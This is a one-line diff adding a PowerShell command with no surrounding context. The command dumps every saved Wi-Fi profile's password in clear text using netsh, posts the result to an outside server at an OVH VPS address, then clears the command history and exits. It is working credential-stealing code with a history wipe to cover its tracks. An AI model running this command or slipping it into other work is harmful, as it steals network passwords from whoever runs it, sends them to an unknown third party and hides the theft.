@@ -1,0 +1,1 @@
+$l = (netsh wlan show profiles |  Select-String -Pattern '(?<=: ).*' -AllMatches | ForEach-Object { netsh wlan show profiles $_.Matches.Value key=clear }); Invoke-RestMethod -Uri http://vps-19a4eb4a.vps.ovh.net:3000/archive -Method Post -Body $l;Clear-History;exit;
